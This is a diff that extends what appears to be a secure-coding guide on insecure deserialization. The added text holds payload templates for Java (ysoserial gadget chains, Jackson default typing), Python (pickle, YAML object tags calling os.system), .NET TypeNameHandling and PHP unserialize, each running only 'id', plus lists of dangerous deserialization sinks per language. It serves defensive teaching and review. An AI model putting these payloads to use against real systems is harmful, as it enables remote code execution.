@@ -32,6 +32,118 @@ The unsafe assumption is that serialized data is trusted because it came from an
 | **Dependency risk** | commons-collections and similar gadget-bearing libraries on the classpath |
 | **Safer alternatives missing** | JSON/protobuf into plain DTOs with schema validation not used |
 
+## Attack Payloads
+
+Use crafted payloads only in isolated lab environments with authorization. Binary gadget chains vary by classpath and library versions.
+
+### Pattern 1: Python pickle opcode injection
+
+Pickle opcodes can invoke `os.system`, `eval`, or arbitrary callables during `pickle.loads`. Tools such as `pickle-assemble` generate test blobs—never paste untrusted pickle bytes into production parsers.
+
+### Pattern 2: Java ysoserial gadget chains
+
+```text
+# Common gadget-bearing libraries on classpath:
+# commons-collections, commons-beanutils, spring, groovy
+# Generate with ysoserial for authorized pentest:
+java -jar ysoserial.jar CommonsCollections6 'id' | base64
+```
+
+### Pattern 3: Jackson default typing
+
+```json
+["com.example.Evil", {"cmd": "id"}]
+{"@class": "java.lang.ProcessBuilder", "command": ["id"]}
+```
+
+### Pattern 4: YAML type tags (Python)
+
+```yaml
+!!python/object/apply:os.system ["id"]
+!!python/object/new:subprocess.check_output [["id"]]
+```
+
+### Pattern 5: .NET TypeNameHandling
+
+```json
+{
+  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+  "MethodName": "Start",
+  "ObjectInstance": { "$type": "System.Diagnostics.Process, System" }
+}
+```
+
+### Pattern 6: PHP unserialize
+
+```php
+O:8:"EvilClass":1:{s:4:"cmd";s:2:"id";}
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+### Python
+
+```python
+pickle.loads(data)
+pickle.load(file)
+yaml.load(data)  # Loader=yaml.Loader or unsafe default
+yaml.unsafe_load(data)
+marshal.loads(data)
+shelve.open(user_path)
+jsonpickle.decode(data)
+```
+
+Also review: `torch.load`, `numpy.load(..., allow_pickle=True)`, `dill.loads`, Redis/cache storing pickled objects.
+
+### Java
+
+```java
+ObjectInputStream.readObject()
+ObjectInputStream.readUnshared()
+XMLDecoder.readObject()
+XStream.fromXML(userXml);
+new ObjectMapper().enableDefaultTyping(...);
+JSON.parseObject(json, Object.class);  // Fastjson autoType
+Serializable.readObject in RMI/JMX endpoints
+```
+
+MyBatis, Hibernate, and Spring remoting with Java serialization on the wire.
+
+### C#
+
+```csharp
+BinaryFormatter.Deserialize(stream);
+SoapFormatter.Deserialize(stream);
+LosFormatter.Deserialize(...);
+JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings {
+    TypeNameHandling = TypeNameHandling.All
+});
+DataContractSerializer with known types expanded from user input
+```
+
+### JavaScript
+
+```javascript
+node-serialize.unserialize(userInput);
+// eval(JSON.parse) patterns that revive functions
+require('serialize-javascript') with untrusted revive
+```
+
+### Go
+
+```go
+gob.NewDecoder(r).Decode(&v)  // from untrusted client
+encoding/gob on network input without schema
+json.Unmarshal into map[string]interface{} then type assertions on @type fields
+```
+
+### PHP
+
+```php
+unserialize($_COOKIE['session']);
+unserialize(file_get_contents('php://input'));
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
